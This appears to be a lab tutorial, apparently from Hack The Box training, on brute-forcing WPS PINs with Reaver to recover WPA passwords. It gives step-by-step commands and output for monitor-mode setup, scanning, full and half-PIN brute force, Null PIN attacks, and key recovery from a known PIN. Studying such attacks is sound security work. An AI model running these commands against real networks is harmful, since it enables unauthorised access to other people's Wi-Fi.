---
title: Performing Online Bruteforcing Using Reaver
description: Performing Online Bruteforcing Using Reaver
date: '2026-09-21'
tags: []
published: true
slug: performing-online-bruteforcing-using-reaver
category: wifi
folder: online-bruteforcing
order: 20
---
# Online PIN Brute-Forcing with Reaver

## What is Reaver?

Reaver is a tool built for cracking WPS PINs. It can:

- Brute-force the full PIN
- Try a "Null PIN" attack (sending no PIN at all)
- Run a Pixie Dust attack (covered in a later guide)
- Crack the second half of a PIN if you already know the first half

---

## Basic Command Format

```
reaver -i [interface] -b [BSSID] -c [channel]
```

**Key options:**

|Option|What It Does|
|---|---|
|`-i`|The monitor-mode interface to use|
|`-b`|Target router's BSSID (MAC address)|
|`-c`|The WiFi channel to use|
|`-p`|Use a specific PIN (or partial PIN)|
|`-d`|Delay between each PIN attempt|
|`-l`|How long to wait if the router locks WPS|
|`-g`|Stop after a certain number of attempts|
|`-r`|Sleep for X seconds every Y attempts|
|`-t`|Set the response timeout|
|`-L`|Ignore the router's "locked" status|
|`-K`, `-Z`|Run a Pixie Dust attack instead|
|`-O`|Save interesting packets to a file|

---

## Step 1: Set Up Monitor Mode (the Reaver-Friendly Way)

⚠️ **Important:** Don't use `airmon-ng` for this — there's a known bug that can break Reaver. Instead, use the `iw` command directly:

```shellsession
iccys@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor

iccys@htb[/htb]$ ifconfig mon0 up

iccys@htb[/htb]$ iwconfig

lo        no wireless extensions.

eth0      no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

This creates a new monitor-mode interface called `mon0`, separate from your regular `wlan0`.

---

## Step 2: Scan for WPS Networks

```shellsession
iccys@htb[/htb]$ airodump-ng mon0 --wps

 CH  8 ][ Elapsed: 0 s ][ 2024-06-26 10:06 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 AE:EB:B0:11:A0:1E  -28       11        0    0   1   54   WPA2 CCMP   PSK  2.0    HackMe   
 B2:A5:1D:E1:B2:11  -28       11        0    0   1   54   WPA2 CCMP   PSK  2.0    GammerZone
 5A:1A:59:B7:E7:97  -28       11        0    0   1   54   WPA2 CCMP   PSK  2.0    Teddy      

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

**In this example**, there are 3 WPS-enabled networks: **HackMe**, **GammerZone**, and **Teddy**.

---

## Step 3: Full Brute-Force Attack

Once you've picked a target, run Reaver with just the interface, BSSID, and channel. It'll automatically try all 11,000 possible PINs:

```shellsession
iccys@htb[/htb]$ reaver -i mon0 -b AE:EB:B0:11:A0:1E -c 1 

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from AE:EB:B0:11:A0:1E
[+] Received beacon from AE:EB:B0:11:A0:1E
[!] Found packet with bad FCS, skipping...
[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
[+] WPS PIN: '96457896'
[+] WPA PSK: '<SNIP>'
[+] AP SSID: 'HackMe'
```

🎉 Success! Reaver found the PIN (`96457896`) and revealed the real WiFi password.

---

## Step 4: Brute-Force When You Already Know Half the PIN

If you already know the first 4 digits (maybe from a leak, a default pattern, or a previous partial crack), you can skip straight to guessing the second half using `-p`:

```shellsession
iccys@htb[/htb]$ reaver -i mon0 -b B2:A5:1D:E1:B2:11 -c 1 -p 1234

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from B2:A5:1D:E1:B2:11
[+] Received beacon from B2:A5:1D:E1:B2:11
[!] Found packet with bad FCS, skipping...
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] 90.91% complete @ 2024-06-21 11:32:33 (0 seconds/pin)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] 91.48% complete @ 2024-06-21 11:34:23 (1 seconds/pin)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] Associated with B2:A5:1D:E1:B2:11 (ESSID: GammerZone)
[+] WPS PIN: '12345678'
[+] WPA PSK: '<SNIP>'
[+] AP SSID: 'GammerZone'
```

Since only the last 4 digits needed guessing, this finished much faster.

---

## Step 5: Try a "Null PIN" Attack

Some routers are misconfigured and will actually accept an **empty PIN** — revealing the password with zero guessing needed. Try it with `-p " "`:

```shellsession
iccys@htb[/htb]$ reaver -b 5A:1A:59:B7:E7:97 -c 1 -i mon0 -p " "

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 5A:1A:59:B7:E7:97
[+] Received beacon from 5A:1A:59:B7:E7:97
[!] Found packet with bad FCS, skipping...
[+] Associated with 5A:1A:59:B7:E7:97 (ESSID: Teddy)
[+] WPS PIN: ' '
[+] WPA PSK: '<SNIP>'
[+] AP SSID: 'Teddy'
```

🎉 No guessing needed at all — the router just handed over the password!

---

## Step 6: Confirm a Known PIN

If you already found a working PIN (maybe from a previous attempt, or printed on a label on the router), you can use it directly to grab the password:

```shellsession
iccys@htb[/htb]$ sudo reaver -i mon0 -b 60:38:E0:2A:4F:21 -p 88766197

<snip>
[+] Pin Cracked in 5 seconds
[+] WPS PIN: '88766197'
[+] WPS PSK: 'WPS-Attacks'
[+] AP SSID: 'HTB-Wireless'
```

📝 **Note:** Using a PIN printed on a label only works if the router is currently in **label mode**.

---

## Command Summary

```bash
iw dev wlan0 interface add mon0 type monitor      # Create a new monitor-mode interface named mon0
ifconfig mon0 up                                  # Turn on the new interface
airodump-ng mon0 --wps                            # Scan for nearby WPS-enabled networks
reaver -i mon0 -b <BSSID> -c <channel>             # Full brute-force attack (all 11,000 PINs)
reaver -i mon0 -b <BSSID> -c <channel> -p <half-PIN>   # Brute-force only the unknown half of the PIN
reaver -b <BSSID> -c <channel> -i mon0 -p " "      # Try a Null PIN attack
reaver -i mon0 -b <BSSID> -p <known-PIN>           # Confirm a known/found PIN and grab the password
```

**What each argument means:**

|Argument|Meaning|
|---|---|
|`-i mon0`|Use the `mon0` monitor-mode interface|
|`-b <BSSID>`|Target router's MAC address|
|`-c <channel>`|The WiFi channel the router is on|
|`-p <value>`|A known PIN, partial PIN, or blank PIN to try|
|`--wps`|Show WPS details in airodump-ng's scan results|
|`type monitor`|Sets the new interface to monitor mode|
